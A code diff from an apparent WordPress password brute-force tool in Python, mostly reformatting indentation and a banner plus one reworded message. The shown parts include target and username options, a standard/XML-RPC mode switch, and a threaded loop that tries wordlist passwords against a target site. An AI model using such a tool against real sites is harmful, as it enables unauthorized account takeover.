@@ -108,10 +108,10 @@ def randomAgentGen():
  return UA
 
 jembut = """
- __      ____________         __________                __          
-/  \    /  \______   \        \______   \______ __ ___ /  |_  ____  
-\   \/\/   /|     ___/   ______ |    |  _|_  __ \  |  \   __\/ __ \ 
- \        / |    |      /_____/ |    |   \|  | \/  |  /|  | \  __ / 
+ __      ____________         __________                __
+/  \    /  \______   \        \______   \______ __ ___ /  |_  ____
+\   \/\/   /|     ___/   ______ |    |  _|_  __ \  |  \   __\/ __ \
+ \        / |    |      /_____/ |    |   \|  | \/  |  /|  | \  __ /
   \__/\  /  |____|              |______  /|__|  |____/ |__|  \___  >
        \/                               \/                       \/
 
@@ -244,7 +244,7 @@ commandList.add_argument('-x', '--xml-rpc',
                   )
 commandList.add_argument('-t', '--target',
                   action="store",
-		  dest="target",
+                  dest="target",
                   help="Insert URL: http://www.site.com",
                   )
 commandList.add_argument('-u', '--username',
@@ -269,7 +269,7 @@ options = commandList.parse_args()
 
 # Cek mode bruteforce conflict
 if options.standard and options.xml:
-   print (y+"\n[*] Select standard [-s]"+w+"OR"+y+"xml-rpc [-x] bruteforce mode")
+   print (g+"[-s]"+w+" Select standard bruteforce mode "+y+"|OR|"+g+" [-x]"+w+" xml-rpc bruteforce mode")
    sys.exit(1)
 
 # Check argument
@@ -332,15 +332,15 @@ count = 0
 threads = []
 
 with open(wlfile) as wordlist:
-	for pwd in wordlist:
-	    count += 1
-	    t = Thread(target=connection, args=(url,user,pwd,UA,timeout,brtmd))
-	    t.start()
-	    threads.append(t)
-	    sys.stdout.write('\r')
-	    sys.stdout.write(g+'[*]'+w+' Bruteforce Running : '+str(count)+'/'+str(wordlisttotal))
-	    sys.stdout.flush()
-	    sleep(0.210)
+        for pwd in wordlist:
+            count += 1
+            t = Thread(target=connection, args=(url,user,pwd,UA,timeout,brtmd))
+            t.start()
+            threads.append(t)
+            sys.stdout.write('\r')
+            sys.stdout.write(g+'[*]'+w+' Bruteforce Running : '+str(count)+'/'+str(wordlisttotal))
+            sys.stdout.flush()
+            sleep(0.210)
 
 for a in threads:
     a.join()
